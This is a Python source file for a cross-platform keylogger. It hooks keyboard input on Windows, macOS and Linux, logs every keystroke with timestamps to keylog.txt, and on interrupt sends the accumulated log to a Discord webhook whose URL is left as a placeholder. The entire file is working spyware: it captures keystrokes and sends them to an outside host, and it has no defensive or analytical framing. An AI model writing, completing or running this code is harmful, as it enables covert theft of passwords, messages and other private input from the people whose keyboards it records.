import os
import sys
import logging
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

# Initialize logging
LOG_FILE_PATH = "keylog.txt"
logging.basicConfig(filename=LOG_FILE_PATH, level=logging.INFO, format='%(asctime)s: %(message)s')

# Global variable to store captured keystrokes
CAPTURED_KEYSTROKES = []

# Function to log keys to a file
def log_key_to_file(key):
    with open(LOG_FILE_PATH, "a") as log_file:
        log_file.write(f"{datetime.now()}: {key}\n")

# Function to send logs to Discord
def send_to_discord():
    webhook_url = "REPLACE_WITH_WEBHOOK_URL"
    try:
        with open(LOG_FILE_PATH, "r") as log_file:
            logs = log_file.read()
        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(description=logs, color='03b2f8')
        webhook.add_embed(embed)
        webhook.execute()
    except Exception as e:
        print(f"Error sending logs to Discord: {e}")

# Keylogger for Linux/macOS using pynput
def start_linux_macos_keylogger():
    from pynput import keyboard

    def on_press(key):
        try:
            key_str = f"{key.char}"
        except AttributeError:
            key_str = f"{key}"
        logging.info(f"Key pressed: {key_str}")
        log_key_to_file(key_str)

    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop the listener
            return False

    print("Starting Keylogger on Linux/macOS...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Keylogger for Windows using keyboard library
def start_windows_keylogger():
    import keyboard

    def log_key(event):
        key_str = f"{event.name} {'down' if event.event_type == 'down' else 'up'}"
        logging.info(f"Key: {key_str}")
        log_key_to_file(key_str)

    print("Starting Keylogger on Windows...")
    keyboard.hook(log_key)
    keyboard.wait('esc')  # Stops keylogger when 'esc' is pressed

# Main function to detect OS and start keylogger
def start_keylogger():
    if os.name == 'nt':  # Windows
        start_windows_keylogger()
    elif sys.platform == 'darwin':  # macOS
        start_linux_macos_keylogger()
    elif os.name == 'posix':  # Linux
        start_linux_macos_keylogger()
    else:
        print("Unsupported operating system.")
        return

if __name__ == "__main__":
    try:
        start_keylogger()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
        send_to_discord()
    except Exception as e:
        print(f"An error occurred: {e}")